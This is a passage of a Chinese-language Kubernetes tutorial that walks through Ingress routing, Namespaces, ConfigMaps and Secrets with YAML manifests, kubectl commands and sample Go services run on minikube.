<span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">阿里云密码</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f hellok8sv1.yaml                 <br><span class="hljs-comment"># service/service-hellok8sv1-clusterip created</span><br><span class="hljs-comment"># deployment.apps/hellok8sv1-deployment created</span><br><br>kubectl apply -f hellok8sv2.yaml   <br><span class="hljs-comment"># service/service-hellok8sv2-clusterip created</span><br><span class="hljs-comment"># deployment.apps/hellok8sv2-deployment created</span><br><br>kubectl get pods            <br><span class="hljs-comment">#NAME                                     READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-comment">#hellok8sv1-deployment-7454486bb7-f6wjx   1/1     Running   0          7m26s</span><br><span class="hljs-comment">#hellok8sv1-deployment-7454486bb7-wpns2   1/1     Running   0          7m26s</span><br><span class="hljs-comment">#hellok8sv2-deployment-586f4fccfd-5szpg   1/1     Running   0          8m50s</span><br><span class="hljs-comment">#hellok8sv2-deployment-586f4fccfd-72dbg   1/1     Running   0          8m50s</span><br><span class="hljs-comment">#hellok8sv2-deployment-586f4fccfd-vmkvl   1/1     Running   0          8m50s</span><br><br><br>kubectl get service<br><span class="hljs-comment">#NAME                           TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE</span><br><span class="hljs-comment">#kubernetes                     ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    22m</span><br><span class="hljs-comment">#service-hellok8sv1-clusterip   ClusterIP   10.108.219.83   &lt;none&gt;        3000/TCP   6m2s</span><br><span class="hljs-comment">#service-hellok8sv2-clusterip   ClusterIP   10.101.123.50   &lt;none&gt;        3000/TCP   6m26s</span><br><br></code></pre></td></tr></table></figure><p>这样在 k8s 集群中，就有 3 个 <code>hellok8s:v2</code> 的 pod，2 个 <code>hellok8s:v1</code> 的 pod。并且<code>hellok8s:v2</code> 的端口映射为 <code>4000:3000</code>，<code>hellok8s:v1</code> 的端口映射为 <code>5000:3000</code>。在这个基础上，接下来编写 Ingress 资源的定义，<code>nginx.ingress.kubernetes.io/ssl-redirect: &quot;false&quot;</code> 的意思是这里关闭 <code>https</code> 连接，只使用 <code>http</code> 连接。</p><p>匹配前缀为 <code>/hello</code> 的路由规则，重定向到 <code>hellok8s:v3</code> 服务，匹配前缀为 <code>/</code> 的跟路径重定向到 <code>nginx</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hello-ingress</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-comment"># We are defining this annotation to prevent nginx</span><br>    <span class="hljs-comment"># from redirecting requests to `https` for now</span><br>    <span class="hljs-attr">nginx.ingress.kubernetes.io/ssl-redirect:</span> <span class="hljs-string">&quot;false&quot;</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">localhost</span><br>      <span class="hljs-attr">http:</span><br>        <span class="hljs-attr">paths:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/hello</span><br>            <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>            <span class="hljs-attr">backend:</span><br>              <span class="hljs-attr">service:</span><br>                <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8sv2-clusterip</span><br>                <span class="hljs-attr">port:</span><br>                  <span class="hljs-attr">number:</span> <span class="hljs-number">4000</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>            <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>            <span class="hljs-attr">backend:</span><br>              <span class="hljs-attr">service:</span><br>                <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8sv1-clusterip</span><br>                <span class="hljs-attr">port:</span><br>                  <span class="hljs-attr">number:</span> <span class="hljs-number">5000</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f ingress.yaml<br><span class="hljs-comment"># ingress.extensions/hello-ingress created</span><br><br>kubectl get ingress          <br><span class="hljs-comment"># NAME            CLASS   HOSTS   ADDRESS   PORTS   AGE</span><br><span class="hljs-comment"># hello-ingress   nginx   *                 80      16s</span><br><br><span class="hljs-comment"># replace 192.168.49.2 by your minikube ip</span><br>curl -H <span class="hljs-string">&quot;Host: localhost&quot;</span> http://192.168.49.2/hello<br><span class="hljs-comment"># [v2] Hello, Kubernetes!</span><br><br>curl -H <span class="hljs-string">&quot;Host: localhost&quot;</span> http://192.168.49.2/<br><span class="hljs-comment"># [v1] Hello, Kubernetes!</span><br></code></pre></td></tr></table></figure><p>这里和service一样，如果本地使用 Docker Desktop（minikube start –driver&#x3D;docker）的话，那你大概率无法通过minikube ip获取到的ip地址来请求，你可以先通过<code>minikube service list</code>来查看服务列表，然后通过<code>minikube service ingress-nginx-controller -n ingress-nginx --url</code>来公开服务，然后通过<code>curl</code>或者浏览器来访问。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube service list<br><span class="hljs-meta prompt_">#</span><span class="language-bash">|---------------|------------------------------------|--------------|---------------------------|</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">|   NAMESPACE   |                NAME                | TARGET PORT  |            URL            |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">|---------------|------------------------------------|--------------|---------------------------|</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| default       | kubernetes                         | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| default       | service-hellok8sv1-clusterip       | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| default       | service-hellok8sv2-clusterip       | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| ingress-nginx | ingress-nginx-controller           | http/80      | http://192.168.49.2:30288 |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">|               |                                    | https/443    | http://192.168.49.2:31616 |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| ingress-nginx | ingress-nginx-controller-admission | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">| kube-system   | kube-dns                           | No node port |                           |</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">|---------------|------------------------------------|--------------|---------------------------|</span><br>minikube service ingress-nginx-controller -n ingress-nginx --url<br><span class="hljs-meta prompt_"># </span><span class="language-bash">http://127.0.0.1:61691      http</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">http://127.0.0.1:61692      https</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">❗  Because you are using a Docker driver on windows, the terminal needs to be open to run it.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">第一个是http，第二个是https，这里我们只需要http，所以我们只需要第一个地址</span><br></code></pre></td></tr></table></figure><p>上面的教程中将所有流量都发送到 Ingress 中，如下图所示：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/ingress.png" alt="ingress"></p><h1 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h1><p>在实际的开发当中，有时候我们需要不同的环境来做开发和测试，例如 <code>dev</code> 环境给开发使用，<code>test</code> 环境给 QA 使用，那么 k8s 能不能在不同环境 <code>dev</code> <code>test</code> <code>uat</code> <code>prod</code> 中区分资源，让不同环境的资源独立互相不影响呢，答案是肯定的，k8s 提供了名为 Namespace 的资源来帮助隔离资源。</p><p>在 Kubernetes 中，<strong>名字空间（Namespace）</strong> 提供一种机制，将同一集群中的资源划分为相互隔离的组。 同一名字空间内的资源名称要唯一，但跨名字空间时没有这个要求。 名字空间作用域仅针对带有名字空间的对象，例如 Deployment、Service 等。</p><p>前面的教程中，默认使用的 namespace 是 <code>default</code>。</p><p>下面展示如何创建一个新的 namespace， <code>namespace.yaml</code> 文件定义了两个不同的 namespace，分别是 <code>dev</code> 和 <code>test</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Namespace</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">dev</span><br>  <br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Namespace</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br></code></pre></td></tr></table></figure><p>可以通过<code>kubectl apply -f namespaces.yaml</code> 创建两个新的 namespace，分别是 <code>dev</code> 和 <code>test</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">kubectl</span> <span class="hljs-string">apply</span> <span class="hljs-string">-f</span> <span class="hljs-string">namespaces.yaml</span>    <br><span class="hljs-comment"># namespace/dev created</span><br><span class="hljs-comment"># namespace/test created</span><br><br><br><span class="hljs-string">kubectl</span> <span class="hljs-string">get</span> <span class="hljs-string">namespaces</span>          <br><span class="hljs-comment"># NAME              STATUS   AGE</span><br><span class="hljs-comment"># default           Active   215d</span><br><span class="hljs-comment"># dev               Active   2m44s</span><br><span class="hljs-comment"># ingress-nginx     Active   110d</span><br><span class="hljs-comment"># kube-node-lease   Active   215d</span><br><span class="hljs-comment"># kube-public       Active   215d</span><br><span class="hljs-comment"># kube-system       Active   215d</span><br><span class="hljs-comment"># test              Active   2m44s</span><br></code></pre></td></tr></table></figure><p>那么如何在新的 namespace 下创建资源和获取资源呢？只需要在命令后面加上 <code>-n namespace</code> 即可。例如根据上面教程中，在名为 <code>dev</code> 的 namespace 下创建 <code>hellok8s:v3</code> 的 deployment 资源。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f deployment.yaml -n dev<br><br>kubectl get pods -n dev<br></code></pre></td></tr></table></figure><h1 id="ConfigMap"><a href="#ConfigMap" class="headerlink" title="ConfigMap"></a>ConfigMap</h1><p>上面的教程提到，我们在不同环境 <code>dev</code> <code>test</code> <code>uat</code> <code>prod</code> 中区分资源，可以让其资源独立互相不受影响，但是随之而来也会带来一些问题，例如不同环境的数据库的地址往往是不一样的，那么如果在代码中写同一个数据库的地址，就会出现问题。</p><p>K8S 使用 ConfigMap 来将你的配置数据和应用程序代码分开，将非机密性的数据保存到键值对中。ConfigMap 在设计上不是用来保存大量数据的。在 ConfigMap 中保存的数据不可超过 1 MiB。如果你需要保存超出此尺寸限制的数据，你可能考虑挂载存储卷。</p><p>下面我们可以来看一个例子，我们修改之前代码，假设不同环境的数据库地址不同，下面代码从环境变量中获取 <code>DB_URL</code>，并将它返回。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>host, _ := os.Hostname()<br>dbURL := os.Getenv(<span class="hljs-string">&quot;DB_URL&quot;</span>)<br>io.WriteString(w, fmt.Sprintf(<span class="hljs-string">&quot;[v4] Hello, Kubernetes! From host: %s, Get Database Connect URL: %s&quot;</span>, host, dbURL))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>构建 <code>hellok8s:v4</code> 的镜像，推送到远程仓库。并删除之前创建的所有资源。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t guangzhengli/hellok8s:v4<br>docker push guangzhengli/hellok8s:v4<br><br>kubectl delete deployment,service,ingress --all<br></code></pre></td></tr></table></figure><p>接下来创建不同 namespace 的 configmap 来存放 <code>DB_URL</code>。</p><p>创建 <code>hellok8s-config-dev.yaml</code> 文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-config</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">DB_URL:</span> <span class="hljs-string">&quot;http://DB_ADDRESS_DEV&quot;</span><br></code></pre></td></tr></table></figure><p>创建 <code>hellok8s-config-test.yaml</code> 文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ConfigMap</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-config</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">DB_URL:</span> <span class="hljs-string">&quot;http://DB_ADDRESS_TEST&quot;</span><br></code></pre></td></tr></table></figure><p>分别在 <code>dev</code> <code>test</code> 两个 namespace 下创建相同的 <code>ConfigMap</code>，名字都叫 hellok8s-config，但是存放的 Pair 对中 Value 值不一样。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hellok8s-config-dev.yaml -n dev<br><span class="hljs-meta prompt_"># </span><span class="language-bash">configmap/hellok8s-config created</span><br><br>kubectl apply -f hellok8s-config-test.yaml -n test <br><span class="hljs-meta prompt_"># </span><span class="language-bash">configmap/hellok8s-config created</span><br><br>kubectl get configmap --all-namespaces<br>NAMESPACE         NAME                                 DATA   AGE<br>dev               hellok8s-config                      1      3m12s<br>test              hellok8s-config                      1      2m1s<br></code></pre></td></tr></table></figure><p>接着使用 POD 的方式来部署 <code>hellok8s:v4</code>，其中 <code>env.name</code> 表示的是将 configmap 中的值写进环境变量，这样代码从环境变量中获取 <code>DB_URL</code>，这个 KEY 名称必须保持一致。<code>valueFrom</code> 代表从哪里读取，<code>configMapKeyRef</code> 这里表示从名为 <code>hellok8s-config</code> 的 <code>configMap</code> 中读取 <code>KEY=DB_URL</code> 的 Value。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:v4</span><br>      <span class="hljs-attr">env:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">DB_URL</span><br>          <span class="hljs-attr">valueFrom:</span><br>            <span class="hljs-attr">configMapKeyRef:</span><br>              <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-config</span><br>              <span class="hljs-attr">key:</span> <span class="hljs-string">DB_URL</span><br></code></pre></td></tr></table></figure><p>下面分别在 <code>dev</code> <code>test</code> 两个 namespace 下创建 <code>hellok8s:v4</code>，接着通过 <code>port-forward</code> 的方式访问不同 namespace 的服务，可以看到返回的 <code>Get Database Connect URL: http://DB_ADDRESS_TEST</code> 是不一样的！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hellok8s.yaml -n dev             <br><span class="hljs-meta prompt_"># </span><span class="language-bash">pod/hellok8s-pod created</span><br><br>kubectl apply -f hellok8s.yaml -n test<br><span class="hljs-meta prompt_"># </span><span class="language-bash">pod/hellok8s-pod created</span><br><br>kubectl port-forward hellok8s-pod 3000:3000 -n dev<br><br>curl http://localhost:3000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v4] Hello, Kubernetes! From host: hellok8s-pod, Get Database Connect URL: http://DB_ADDRESS_DEV</span><br><br>kubectl port-forward hellok8s-pod 3000:3000 -n test<br><br>curl http://localhost:3000<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v4] Hello, Kubernetes! From host: hellok8s-pod, Get Database Connect URL: http://DB_ADDRESS_TEST</span><br></code></pre></td></tr></table></figure><h1 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h1><p>上面提到，我们会选择以 configmap 的方式挂载配置信息，但是当我们的配置信息需要加密的时候， configmap 就无法满足这个要求。例如上面要挂载数据库密码的时候，就需要明文挂载。</p><p>这个时候就需要 Secret 来存储加密信息，虽然在资源文件的编码上，只是通过 Base64 的方式简单编码，但是在实际生产过程中，可以通过 pipeline 或者专业的 <a href="https://aws.amazon.com/kms/">AWS KMS</a> 服务进行密钥管理。这样就大大减少了安全事故。</p><blockquote><p>Secret 是一种包含少量敏感信息例如密码、令牌或密钥的对象。由于创建 Secret 可以独立于使用它们的 Pod， 因此在创建、查看和编辑 Pod 的工作流程中暴露 Secret（及其数据）的风险较小。 Kubernetes 和在集群中运行的应用程序也可以对 Secret 采取额外的预防措施， 例如避免将机密数据写入非易失性存储。</p><p>默认情况下，Kubernetes Secret 未加密地存储在 API 服务器的底层数据存储（etcd）中。 任何拥有 API 访问权限的人都可以检索或修改 Secret，任何有权访问 etcd 的人也可以。 此外，任何有权限在命名空间中创建 Pod 的人都可以使用该访问权限读取该命名空间中的任何 Secret； 这包括间接访问，例如创建 Deployment 的能力。</p><p>为了安全地使用 Secret，请至少执行以下步骤：</p><ol><li>为 Secret <a href="https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/">启用静态加密</a>；</li><li><a href="https://kubernetes.io/docs/reference/access-authn-authz/authorization/">启用或配置 RBAC 规则</a>来限制读取和写入 Secret 的数据（包括通过间接方式）。需要注意的是，被准许创建 Pod 的人也隐式地被授权获取 Secret 内容。</li><li>在适当的情况下，还可以使用 RBAC 等机制来限制允许哪些主体创建新 Secret 或替换现有 Secret。</li></ol></blockquote><p>Secret 的资源定义和 ConfigMap 结构基本一致，唯一区别在于 kind 是 <code>Secret</code>，还有 Value 需要 Base64 编码，你可以通过下面命令快速 Base64 编解码。当然 Secret 也提供了一种 <code>stringData</code>，可以不需要 Base64 编码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;db_password&quot; | base64<br><span class="hljs-meta prompt_"># </span><span class="language-bash">ZGJfcGFzc3dvcmQK</span><br><br>echo &quot;ZGJfcGFzc3dvcmQK&quot; | base64 -d<br><span class="hljs-meta prompt_"># </span><span class="language-bash">db_password</span><br></code></pre></td></tr></table></figure><p>这里将 Base64 编码过后的值，填入对应的 key - value 中。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># hellok8s-secret.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Secret</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-secret</span><br><span class="hljs-attr">data:</span><br>  <span class="hljs-attr">DB_PASSWORD:</span> <span class="hljs-string">&quot;ZGJfcGFzc3dvcmQK&quot;</span><br><span class="hljs-comment"># hellok8s.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:v5</span><br>      <span class="hljs-attr">env:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">DB_PASSWORD</span><br>          <span class="hljs-attr">valueFrom:</span><br>            <span class="hljs-attr">secretKeyRef:</span><br>              <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-secret</span><br>              <span class="hljs-attr">key:</span> <span class="hljs-string">DB_PASSWORD</span><br><span class="hljs-string">package</span> <span class="hljs-string">main</span><br><br><span class="hljs-string">import</span> <span class="hljs-string">(</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">)</span><br><br><span class="hljs-string">func</span> <span class="hljs-string">hello(w</span> <span class="hljs-string">http.ResponseWriter,</span> <span class="hljs-string">r</span> <span class="hljs-string">*http.Request)</span> &#123;<br><span class="hljs-string">host</span>, <span class="hljs-string">_</span> <span class="hljs-string">:=</span> <span class="hljs-string">os.Hostname()</span><br><span class="hljs-string">dbPassword</span> <span class="hljs-string">:=</span> <span class="hljs-string">os.Getenv(&quot;DB_PASSWORD&quot;)</span><br><span class="hljs-string">io.WriteString(w</span>, <span class="hljs-string">fmt.Sprintf(&quot;</span>[<span class="hljs-string">v5</span>] <span class="hljs-string">Hello</span>, <span class="hljs-string">Kubernetes!</span> <span class="hljs-attr">From host:</span> <span class="hljs-string">%s</span>, <span class="hljs-attr">Get Database Connect Password:</span> <span class="hljs-string">%s&quot;</span>, <span class="hljs-string">host</span>, <span class="hljs-string">dbPassword))</span><br>&#125;<br><br><span class="hljs-string">func</span> <span class="hljs-string">main()</span> &#123;<br><span class="hljs-string">http.HandleFunc(&quot;/&quot;</span>, <span class="hljs-string">hello)</span><br><span class="hljs-string">http.ListenAndServe(&quot;:3000&quot;</span>, <span class="hljs-string">nil)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在代码中读取 <code>DB_PASSWORD</code> 环境变量，直接返回对应字符串。Secret 的使用方法和前面教程中 ConfigMap 基本一致，这里就不再过多赘述。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t guangzhengli/hellok8s:v5<br><br>docker push guangzhengli/hellok8s:v5<br><br>kubectl apply -f hellok8s-secret.yaml<br><br>kubectl apply -f hellok8s.yaml<br><br>kubectl port-forward hellok8s-pod 3000:3000<br></code></pre></td></tr></table></figure><h1 id="Job"><a href="#Job" class="headerlink" title="Job"></a>Job</h1><p>在实际的开发过程中，还有一类任务是之前的资源不能满足的，即一次性任务。例如常见的计算任务，只需要拿到相关数据计算后得出结果即可，无需一直运行。而处理这一类任务的资源就是 Job。</p><blockquote><p>Job 会创建一个或者多个 Pod，并将继续重试 Pod 的执行，直到指定数量的 Pod 成功终止。 随着 Pod 成功结束，Job 跟踪记录成功完成的 Pod 个数。 当数量达到指定的成功个数阈值时，任务（即 Job）结束。 删除 Job 的操作会清除所创建的全部 Pod。 挂起 Job 的操作会删除 Job 的所有活跃 Pod，直到 Job 被再次恢复执行。</p><p>一种简单的使用场景下，你会创建一个 Job 对象以便以一种可靠的方式运行某 Pod 直到完成。 当第一个 Pod 失败或者被删除（比如因为节点硬件失效或者重启）时，Job 对象会启动一个新的 Pod。</p></blockquote><p>下面来看一个 Job 的资源定义，其中 Kind 和 